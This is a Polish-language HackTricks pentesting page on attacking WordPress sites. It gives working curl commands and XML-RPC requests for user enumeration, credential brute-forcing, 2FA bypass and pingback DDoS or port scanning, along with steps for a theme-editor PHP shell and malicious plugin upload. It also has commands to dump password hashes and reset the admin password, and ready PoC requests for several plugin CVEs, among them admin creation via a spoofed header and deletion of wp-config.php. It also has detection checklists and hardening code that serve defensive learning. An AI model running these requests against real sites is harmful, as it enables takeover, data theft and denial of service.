# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Podstawowe informacje

- **Wgrane** pliki trafiają do: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Pliki motywów można znaleźć w /wp-content/themes/,** więc jeśli zmienisz jakiś php motywu, aby uzyskać RCE prawdopodobnie użyjesz tej ścieżki. Na przykład: używając **theme twentytwelve** możesz **access** plik **404.php** w: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- W pliku **wp-config.php** możesz znaleźć hasło użytkownika root bazy danych.
- Domyślne ścieżki logowania do sprawdzenia: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Główne pliki WordPress**

- `index.php`
- `license.txt` zawiera użyteczne informacje, takie jak zainstalowana wersja WordPress.
- `wp-activate.php` jest używany do procesu aktywacji email podczas zakładania nowej strony WordPress.
- Foldery logowania (mogą być przemianowane, aby je ukryć):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` to plik reprezentujący funkcję WordPress, która umożliwia przesyłanie danych z HTTP jako mechanizmem transportu i XML jako mechanizmem kodowania. Tego rodzaju komunikacja została zastąpiona przez WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- Folder `wp-content` to główny katalog, w którym przechowywane są plugins i themes.
- `wp-content/uploads/` to katalog, w którym przechowywane są wszystkie pliki przesłane na platformę.
- `wp-includes/` to katalog, w którym przechowywane są pliki core, takie jak certyfikaty, fonty, pliki JavaScript i widgety.
- `wp-sitemap.xml` W wersjach WordPress 5.5 i wyższych, WordPress generuje plik sitemap XML zawierający wszystkie publiczne wpisy oraz publicznie queryable typy wpisów i taksonomie.

**Post exploitation**

- Plik `wp-config.php` zawiera informacje wymagane przez WordPress do połączenia z bazą danych, takie jak nazwa bazy danych, host bazy, nazwa użytkownika i hasło, authentication keys and salts oraz prefiks tabel bazy danych. Ten plik konfiguracyjny można również użyć do aktywacji trybu DEBUG, co może być przydatne przy rozwiązywaniu problemów.

### Uprawnienia użytkowników

- **Administrator**
- **Editor**: Publikuje i zarządza swoimi oraz cudzymi wpisami
- **Author**: Publikuje i zarządza własnymi wpisami
- **Contributor**: Pisze i zarządza swoimi wpisami, ale nie może ich publikować
- **Subscriber**: Przegląda wpisy i edytuje swój profil

## **Passive Enumeration**

### **Get WordPress version**

Sprawdź, czy możesz znaleźć pliki `/license.txt` lub `/readme.html`

W kodzie źródłowym strony (przykład z [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Pliki linków CSS

![](<../../images/image (533).png>)

- Pliki JavaScript

![](<../../images/image (524).png>)

### Pobierz wtyczki
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Pobierz motywy
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Ogólne wyodrębnianie wersji
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Aktywna enumeracja

### Wtyczki i motywy

Prawdopodobnie nie będziesz w stanie znaleźć wszystkich możliwych Wtyczek i Motywów. Aby odkryć je wszystkie, będziesz musiał **actively Brute Force a list of Plugins and Themes** (miejmy nadzieję, że istnieją automatyczne narzędzia, które zawierają te listy).

### Użytkownicy

- **ID Brute:** Uzyskujesz prawidłowych użytkowników z witryny WordPress przez Brute Forcing ID użytkowników:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Jeśli odpowiedzi to **200** lub **30X**, oznacza to, że id jest **prawidłowe**. Jeśli odpowiedź to **400**, oznacza to, że id jest **nieprawidłowe**.

- **wp-json:** Możesz też spróbować uzyskać informacje o użytkownikach, wykonując zapytanie:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Kolejny endpoint `/wp-json/`, który może ujawnić pewne informacje o użytkownikach, to:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Zauważ, że ten endpoint ujawnia tylko użytkowników, którzy opublikowali post. **Dostarczone zostaną tylko informacje o użytkownikach, którzy mają tę funkcję włączoną**.

Zwróć również uwagę, że **/wp-json/wp/v2/pages** could leak IP addresses.

- **Login username enumeration**: Podczas logowania przez **`/wp-login.php`** **komunikat** jest **inny** w zależności od tego, czy **nazwa użytkownika istnieje czy nie**.

### XML-RPC

Jeśli `xml-rpc.php` jest aktywny, możesz przeprowadzić credentials brute-force lub użyć go do uruchomienia DoS na inne zasoby. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

Aby sprawdzić, czy jest aktywny, spróbuj uzyskać dostęp do _**/xmlrpc.php**_ i wyślij to żądanie:

**Sprawdź**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** lub **`metaWeblog.getUsersBlogs`** to niektóre z metod, które można użyć do brute-force credentials. Jeśli znajdziesz którąkolwiek z nich, możesz wysłać coś takiego:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Komunikat _"Incorrect username or password"_ w odpowiedzi z kodem 200 powinien się pojawić, jeśli dane uwierzytelniające są nieprawidłowe.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Używając prawidłowych danych uwierzytelniających możesz przesłać plik. W odpowiedzi pojawi się ścieżka ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Also there is a **faster way** to brute-force credentials using **`system.multicall`** as you can try several credentials on the same request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Omijanie 2FA**

Ta metoda jest przeznaczona dla programów, nie dla ludzi, i jest stara, więc nie obsługuje 2FA. Jeśli więc masz ważne creds, ale główne wejście jest chronione 2FA, **możesz być w stanie nadużyć xmlrpc.php, aby zalogować się tymi creds, omijając 2FA**. Zwróć uwagę, że nie będziesz mógł wykonać wszystkich akcji dostępnych przez console, ale nadal możesz dojść do RCE, jak Ippsec wyjaśnia w [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS lub skanowanie portów**

If you can find the method _**pingback.ping**_ inside the list you can make the Wordpress send an arbitrary request to any host/port.\
This can be used to ask **tysiące** of Wordpress **sites** to **dostęp** one **location** (so a **DDoS** is caused in that location) or you can use it to make **Wordpress** **przeskanować** some internal **network** (you can indicate any port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Jeśli otrzymasz **faultCode** o wartości **większej** niż **0** (17), oznacza to, że port jest otwarty.

Zobacz użycie **`system.multicall`** w poprzedniej sekcji, aby dowiedzieć się, jak nadużyć tej metody, by spowodować DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Ten plik zwykle znajduje się w katalogu głównym strony WordPress: **`/wp-cron.php`**\
Kiedy ten plik jest **wywoływany**, wykonywane jest „heavy” MySQL **query**, więc może być użyty przez **atakujących** do **wywołania** **DoS**.\
Domyślnie `wp-cron.php` jest wywoływany przy każdym ładowaniu strony (za każdym razem, gdy klient żąda dowolnej strony WordPress), co na stronach o dużym ruchu może powodować problemy (DoS).

Zalecane jest wyłączenie Wp-Cron i utworzenie prawdziwego cronjoba na hoście, który będzie wykonywał potrzebne działania w regularnych odstępach (bez powodowania problemów).

### /wp-json/oembed/1.0/proxy - SSRF

Spróbuj uzyskać dostęp do _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ i strona WordPress może wykonać żądanie do Ciebie.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

To narzędzie sprawdza, czy istnieje **methodName: pingback.ping** oraz ścieżka **/wp-json/oembed/1.0/proxy**, i jeśli tak, próbuje je wykorzystać.

## Automatic Tools
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Uzyskaj dostęp przez nadpisanie bitu

To raczej ciekawostka niż prawdziwy atak. W CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) można było zmienić 1 bit w dowolnym pliku wordpress. Dzięki temu można było zmienić bit na pozycji `5389` w pliku `/var/www/html/wp-includes/user.php`, aby zamienić operację NOT (`!`) na NOP.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modyfikacja php z używanego motywu (wymagane dane logowania admina)**

Wygląd → Edytor motywu → Szablon 404 (po prawej)

Zamień zawartość na php shell:

![](<../../images/image (384).png>)

Wyszukaj w internecie, jak uzyskać dostęp do zaktualizowanej strony. W tym przypadku musisz wejść tutaj: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Możesz użyć:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
aby uzyskać sesję.

## Plugin RCE

### Wtyczka PHP

Możliwe, że da się przesłać pliki .php jako wtyczkę.\
Utwórz swój PHP backdoor używając na przykład:

![](<../../images/image (183).png>)

Następnie dodaj nową wtyczkę:

![](<../../images/image (722).png>)

Prześlij wtyczkę i kliknij Install Now:

![](<../../images/image (249).png>)

Kliknij na Procced:

![](<../../images/image (70).png>)

Prawdopodobnie nic się nie stanie, ale jeśli przejdziesz do Media, zobaczysz przesłany shell:

![](<../../images/image (462).png>)

Otwórz go i zobaczysz URL umożliwiający uruchomienie reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Ta metoda polega na zainstalowaniu złośliwej wtyczki znanej z podatności i może zostać wykorzystana do uzyskania web shell. Proces ten jest przeprowadzany przez WordPress dashboard w następujący sposób:

1. **Pozyskanie wtyczki**: Wtyczka jest pobierana ze źródła takiego jak Exploit DB jak [**here**](https://www.exploit-db.com/exploits/36374).
2. **Instalacja wtyczki**:
- Przejdź do WordPress dashboard, potem do `Dashboard > Plugins > Upload Plugin`.
- Prześlij plik zip pobranej wtyczki.
3. **Aktywacja wtyczki**: Po pomyślnej instalacji wtyczka musi zostać aktywowana przez dashboard.
4. **Eksploatacja**:
- Z zainstalowaną i aktywowaną wtyczką "reflex-gallery" można ją wykorzystać, ponieważ jest znana z podatności.
- Metasploit framework dostarcza exploit dla tej podatności. Ładując odpowiedni moduł i wykonując konkretne polecenia, można uzyskać sesję meterpreter, zapewniając nieautoryzowany dostęp do serwisu.
- Należy zaznaczyć, że to tylko jedna z wielu metod wykorzystywania witryny WordPress.

Treść zawiera materiały wizualne ilustrujące kroki w WordPress dashboard podczas instalacji i aktywacji wtyczki. Należy jednak pamiętać, że wykorzystywanie podatności w ten sposób jest nielegalne i nieetyczne bez odpowiedniej autoryzacji. Informacje te powinny być używane odpowiedzialnie i tylko w legalnym kontekście, takim jak pentesting z wyraźną zgodą.

**Dla bardziej szczegółowych kroków sprawdź:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## Od XSS do RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ to skrypt zaprojektowany do eskalacji podatności **Cross-Site Scripting (XSS)** do **Remote Code Execution (RCE)** lub innych krytycznych podatności w WordPress. Po więcej informacji sprawdź [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Zapewnia **wsparcie dla Wordpress Versions 6.X.X, 5.X.X and 4.X.X. oraz pozwala na:**
- _**Privilege Escalation:**_ Tworzy użytkownika w WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Prześlij swój custom plugin (backdoor) do WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Edytuje wbudowane pluginy w WordPress.
- _**(RCE) Built-In Theme Edit:**_ Edytuje wbudowane motywy w WordPress.
- _**(Custom) Custom Exploits:**_ Niestandardowe exploity dla third-party WordPress Plugins/Themes.

## Po eksploatacji

Wyodrębnij nazwy użytkowników i hasła:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Zmień hasło admina:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Pentest wtyczek Wordpress

### Powierzchnia ataku

Znajomość sposobów, w jakie wtyczka Wordpress może ujawniać funkcjonalność, jest kluczowa do znalezienia podatności w jej funkcjach. Poniżej znajdziesz, jak wtyczka może ujawniać funkcjonalność oraz kilka przykładów podatnych wtyczek w [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Jednym ze sposobów, w jaki wtyczka może udostępniać funkcje użytkownikom, są obsługiwacze AJAX. Mogą one zawierać błędy logiczne, autoryzacji lub uwierzytelniania. Co więcej, dość często te funkcje opierają zarówno uwierzytelnianie, jak i autoryzację na istnieniu wordpress nonce, które może posiadać **każdy użytkownik zalogowany w instancji Wordpress** (niezależnie od jego roli).

Te funkcje mogą być użyte do udostępnienia funkcji w wtyczce:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**Użycie `nopriv` sprawia, że endpoint jest dostępny dla wszystkich użytkowników (nawet niezalogowanych).**

> [!CAUTION]
> Co więcej, jeśli funkcja jedynie sprawdza autoryzację użytkownika za pomocą funkcji `wp_verify_nonce`, to funkcja ta tylko weryfikuje, że użytkownik jest zalogowany — zwykle nie sprawdza roli użytkownika. W efekcie użytkownicy o niskich uprawnieniach mogą mieć dostęp do operacji wymagających wyższych uprawnień.

- **REST API**

Możliwe jest też udostępnienie funkcji z wordpress poprzez zarejestrowanie REST API za pomocą funkcji `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` to callback do funkcji, która sprawdza, czy dany użytkownik jest uprawniony do wywołania metody API.

**Jeśli użyta jest wbudowana funkcja `__return_true`, po prostu pominie sprawdzenie uprawnień użytkownika.**

- **Bezpośredni dostęp do pliku php**

Oczywiście Wordpress używa PHP, a pliki wewnątrz pluginów są bezpośrednio dostępne z sieci. Jeśli więc plugin ujawnia podatną funkcjonalność, która uruchamia się po samym dostępie do pliku, będzie ona eksploatowalna przez dowolnego użytkownika.

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

Niektóre pluginy implementują “trusted header” skróty dla integracji wewnętrznych lub reverse proxy i następnie używają tego nagłówka do ustawienia kontekstu bieżącego użytkownika dla żądań REST. Jeśli nagłówek nie jest kryptograficznie powiązany z żądaniem przez komponent nadrzędny, atakujący może go sfałszować i wywołać uprzywilejowane trasy REST jako administrator.

- Skutek: nieautoryzowana eskalacja uprawnień do administratora przez utworzenie nowego administratora za pomocą core users REST route.
- Przykładowy nagłówek: `X-Wcpay-Platform-Checkout-User: 1` (wymusza ID użytkownika 1, zwykle pierwsze konto administratora).
- Eksploatowana trasa: `POST /wp-json/wp/v2/users` z tablicą roli nadającą wyższe uprawnienia.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Dlaczego to działa

- Wtyczka mapuje nagłówek kontrolowany przez klienta na stan uwierzytelnienia i pomija sprawdzenia uprawnień (capability checks).
- WordPress core oczekuje uprawnienia `create_users` dla tej ścieżki; hack wtyczki omija to, ustawiając bezpośrednio kontekst bieżącego użytkownika z nagłówka.

Oczekiwane wskaźniki sukcesu

- HTTP 201 z ciałem JSON opisującym utworzonego użytkownika.
- Nowy użytkownik z uprawnieniami admin widoczny w `wp-admin/users.php`.

Lista kontrolna wykrywania

- Przeszukaj (grep) pod kątem `getallheaders()`, `$_SERVER['HTTP_...']` lub SDK dostawców, które odczytują niestandardowe nagłówki, aby ustawić kontekst użytkownika (np. `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Przejrzyj rejestracje REST pod kątem uprzywilejowanych callbacków, którym brakuje solidnych sprawdzeń `permission_callback` i które zamiast tego polegają na nagłówkach żądań.
- Szukaj użyć podstawowych funkcji zarządzania użytkownikami (`wp_insert_user`, `wp_create_user`) wewnątrz handlerów REST, które są zabezpieczone jedynie przez wartości nagłówków.

Wzmocnienie

- Nigdy nie wyprowadzaj uwierzytelnienia ani autoryzacji z nagłówków kontrolowanych przez klienta.
- Jeśli reverse proxy musi wstrzykiwać tożsamość, zakończ zaufanie przy proxy i usuń przychodzące kopie (np. `unset X-Wcpay-Platform-Checkout-User` na krawędzi), następnie przekaż podpisany token i zweryfikuj go po stronie serwera.
- Dla tras REST wykonujących uprzywilejowane akcje wymagaj sprawdzeń `current_user_can()` i rygorystycznego `permission_callback` (NIE używaj `__return_true`).
- Preferuj uwierzytelnianie pierwszej strony (cookies, application passwords, OAuth) zamiast „impersonation” przez nagłówki.

References: see the links at the end of this page for a public case and broader analysis.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_` hooks.  When the **_nopriv_** variant is used **the callback becomes reachable by unauthenticated visitors**, so any sensitive action must additionally implement:

1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Strict input sanitisation / validation**.

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Problemy wprowadzone przez ten fragment:

* **Dostęp bez uwierzytelnienia** – zarejestrowano hook `wp_ajax_nopriv_`.
* **Brak sprawdzania nonce / uprawnień** – każdy odwiedzający może trafić do tego endpointu.
* **Brak sanitizacji ścieżki** – ciąg sterowany przez użytkownika `fontfamily` jest konkatenowany do ścieżki w systemie plików bez filtrowania, pozwalając na klasyczny `../../` traversal.

#### Eksploatacja

Atakujący może usunąć dowolny plik lub katalog **poniżej katalogu bazowego uploads** (zazwyczaj `<wp-root>/wp-content/uploads/`) wysyłając pojedyncze żądanie HTTP POST:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Ponieważ `wp-config.php` znajduje się poza katalogiem *uploads*, w domyślnej instalacji wystarczą cztery sekwencje `../`. Usunięcie `wp-config.php` wymusza na WordPress uruchomienie *installation wizard* przy następnym odwiedzeniu strony, co umożliwia pełne przejęcie serwisu (atakujący jedynie dostarcza nową konfigurację DB i tworzy użytkownika admin).

Inne istotne cele to pliki `.php` w pluginach/motywach (aby złamać wtyczki zabezpieczające) lub reguły `.htaccess`.

#### Lista kontrolna detekcji

* Każdy callback `add_action( 'wp_ajax_nopriv_...')`, który wywołuje helpery systemu plików (`copy()`, `unlink()`, `$wp_filesystem->delete()`, itd.).
* Łączenie niesanitizowanych danych wejściowych od użytkownika w ścieżki (szukaj `$_POST`, `$_GET`, `$_REQUEST`).
* Brak `check_ajax_referer()` oraz `current_user_can()`/`is_user_logged_in()`.

#### Utwardzanie
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// … proceed …
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  🔒  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Zawsze** traktuj każdą operację zapisu/usunięcia na dysku jako uprzywilejowaną i sprawdź dwukrotnie:
> • Authentication  • Authorisation  • Nonce  • Input sanitisation  • Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

Wiele wtyczek implementuje funkcję "view as role" lub tymczasową zmianę roli poprzez zapisanie oryginalnej(-ych) roli(-i) w user meta, aby można je było przywrócić później. Jeśli ścieżka przywracania opiera się wyłącznie na parametrach żądania (np. `$_REQUEST['reset-for']`) i na liście utrzymywanej przez wtyczkę, bez sprawdzenia capabilities i ważnego nonce, staje się to vertical privilege escalation.

Przykład z rzeczywistego świata znaleziono we wtyczce Admin and Site Enhancements (ASE) (≤ 7.6.2.1). W gałęzi resetu przywracano role na podstawie `reset-for=<username>` jeśli nazwa użytkownika pojawiała się w wewnętrznej tablicy `$options['viewing_admin_as_role_are']`, ale nie wykonano sprawdzenia `current_user_can()` ani weryfikacji nonce przed usunięciem obecnych ról i ponownym dodaniem zapisanych ról z user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Dlaczego to jest podatne

- Ufa `$_REQUEST['reset-for']` i opcji wtyczki bez autoryzacji po stronie serwera.
- Jeśli użytkownik wcześniej miał wyższe uprawnienia zapisane w `_asenha_view_admin_as_original_roles` i został zdegradowany, może je przywrócić, wywołując ścieżkę resetu.
- W niektórych wdrożeniach dowolny uwierzytelniony użytkownik mógł wywołać reset dla innej nazwy użytkownika nadal obecnej w `viewing_admin_as_role_are` (złamana autoryzacja).

Wymagania wstępne ataku

- Wrażliwa wersja wtyczki z włączoną funkcją.
- Konto docelowe ma przeterminowaną rolę o wysokich uprawnieniach zapisaną w user meta z wcześniejszego użycia.
- Dowolna uwierzytelniona sesja; brak nonce/capability w ścieżce resetu.

Eksploatacja (przykład)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
W podatnych wersjach usuwa to aktualne role i ponownie dodaje zapisane oryginalne role (np. `administrator`), skutecznie eskalując uprawnienia.

Detection checklist

- Szukaj funkcji przełączania ról, które zachowują „oryginalne role” w meta użytkownika (np. `_asenha_view_admin_as_original_roles`).
- Zidentyfikuj ścieżki resetowania/przywracania, które:
- Odczytują nazwy użytkowników z `$_REQUEST` / `$_GET` / `$_POST`.
- Modyfikują role za pomocą `add_role()` / `remove_role()` bez użycia `current_user_can()` i `wp_verify_nonce()` / `check_admin_referer()`.
- Autoryzują na podstawie tablicy opcji wtyczki (np. `viewing_admin_as_role_are`) zamiast na podstawie uprawnień wykonawcy.

Hardening

- Wymagaj sprawdzeń uprawnień w każdym fragmencie kodu zmieniającym stan (np. `current_user_can('manage_options')` lub surowsze).
- Wymagaj nonce'ów dla wszystkich zmian ról/uprawnień i weryfikuj je: `check_admin_referer()` / `wp_verify_nonce()`.
- Nigdy nie ufaj nazwom użytkowników dostarczonym w żądaniu; rozstrzygaj docelowego użytkownika po stronie serwera na podstawie uwierzytelnionego wykonawcy i jawnej polityki.
- Unieważniaj stan „oryginalnych ról” przy aktualizacjach profilu/rol, aby uniknąć przywrócenia przestarzałych wysokich uprawnień:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- Rozważ przechowywanie minimalnego stanu i użycie tokenów ograniczonych czasowo, zabezpieczonych capability, do tymczasowych zmian ról.

---

### Eskalacja uprawnień bez uwierzytelnienia przez przełączanie użytkownika zaufane przez cookie na publicznym init (Service Finder “sf-booking”)

Niektóre wtyczki podłączają funkcje pomocnicze do przełączania użytkowników do publicznego haka `init` i wyznaczają tożsamość na podstawie cookie kontrolowanego przez klienta. Jeśli kod wywołuje `wp_set_auth_cookie()` bez weryfikacji uwierzytelnienia, capability i ważnego nonce, każdy niezalogowany odwiedzający może wymusić zalogowanie jako dowolny użytkownik o określonym ID.

Typowy podatny wzorzec (uproszczony z Service Finder Bookings ≤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // 🔥 sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Dlaczego jest to eksploatowalne

- Publiczny hook `init` powoduje, że handler jest dostępny dla niezalogowanych użytkowników (brak zabezpieczenia `is_user_logged_in()`).
- Tożsamość jest wyprowadzana z cookie modyfikowalnego po stronie klienta (`original_user_id`).
- Bezpośrednie wywołanie `wp_set_auth_cookie($uid)` loguje żądającego jako tego użytkownika bez żadnych sprawdzeń capability/nonce.

Eksploatacja (bez uwierzytelnienia)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### Uwagi dotyczące WAF dla CVE WordPress/pluginów

Ogólne WAFy brzegowe/serwerowe są dostrojone pod kątem szerokich wzorców (SQLi, XSS, LFI). Wiele błędów o dużym wpływie w WordPressie/wtyczkach to błędy logiki/autoryzacji specyficzne dla aplikacji, które wyglądają jak nieszkodliwy ruch, chyba że silnik rozumie trasy WordPressa i semantykę wtyczek.

